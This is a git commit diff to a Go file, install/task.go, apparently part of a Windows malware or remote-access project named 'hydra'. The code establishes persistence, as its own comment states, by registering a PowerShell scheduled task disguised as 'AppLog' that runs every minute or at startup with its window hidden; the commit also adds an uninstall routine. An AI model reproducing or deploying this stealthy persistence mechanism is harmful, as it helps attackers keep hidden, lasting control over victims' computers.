e10aae3ba2071029b3d21920d9e6daaa9d7641b0
Raffy27 <raffy27@pm.me>
2021-02-27 22:18:07 +0200

    Task uninstalling

--- install/task.go
+++ install/task.go
@@ -15,8 +15,10 @@ const (
 	minTrigger  = "$t=New-ScheduledTaskTrigger -RepetitionI (New-TimeSpan -M 1) -O -At (Date);"
 	maxTrigger  = "$t=New-ScheduledTaskTrigger -AtStartup;"
 	addTaskCmd2 = "Register-ScheduledTask -Ac $a -Tr $t -TaskN '%s' -D '%s'"
+	remTaskCmd  = "Unregister-ScheduledTask -TaskN '%s' -Co:$false"
 )
 
+//TryTaskInstall attempts to establish persistence by creating a scheduled task.
 func TryTaskInstall() error {
 	pscmd := fmt.Sprintf(addTaskCmd1, "C:/Users/Raffy/Saved Games/.hydra/")
 	if util.RunningAsAdmin() {
@@ -27,6 +29,18 @@ func TryTaskInstall() error {
 	pscmd += fmt.Sprintf(addTaskCmd2, "AppLog", "This is a description.")
 
 	cmd := exec.Command("powershell", pscmd)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	out, err := cmd.CombinedOutput()
+
+	if strings.Contains(string(out), "FullyQualifiedErrorId") {
+		return errors.New("Failed to create task")
+	}
+	return err
+}
+
+//UninstallTask removes the scheduled task entry created by the install procedure.
+func UninstallTask() error {
+	cmd := exec.Command("powershell", fmt.Sprintf(remTaskCmd, "AppLog"))
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	out, err := cmd.CombinedOutput()
 
